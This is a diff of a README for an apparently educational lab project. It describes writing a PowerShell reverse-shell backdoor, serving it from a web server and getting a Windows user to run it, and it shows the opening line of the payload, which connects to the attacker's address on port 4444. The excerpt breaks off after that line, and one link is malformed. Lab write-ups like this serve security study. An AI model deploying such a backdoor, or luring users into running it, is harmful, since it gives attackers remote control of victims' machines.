@@ -12,8 +12,6 @@ This project demonstrates how to create and deploy a malicious PowerShell script
   - **IP Address:** 192.168.20.30
 
 ## Objective
-
-The goal of this exercise is to:
 1. Create a malicious PowerShell script (malicious.ps1) to establish a reverse shell backdoor.
 2. Use a web server to serve the payload to the target Windows machine.
 3. Make the Windows user download and execute the malicious script.
@@ -23,9 +21,7 @@ The goal of this exercise is to:
 
 ### 1. **Create Malicious PowerShell Payload**
 
-The first step in the attack was to create the malicious PowerShell script (`malicious.ps1`) that would establish a reverse shell back to the attacker's Kali Linux machine.
-
-The script creates a TCP connection to the attacker's IP (`192.168.20.30`) on port `4444`, allowing the attacker to execute commands on the target machine. The code is as follows:
+Firstly, I created a malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell back to my Kali's machine, based on this git and forum ([git]([https://example.com](https://github.com/das-lab/mpsd) and [this](https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test?source=recommendations&view=o365-worldwide):
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("192.168.20.30", 4444)
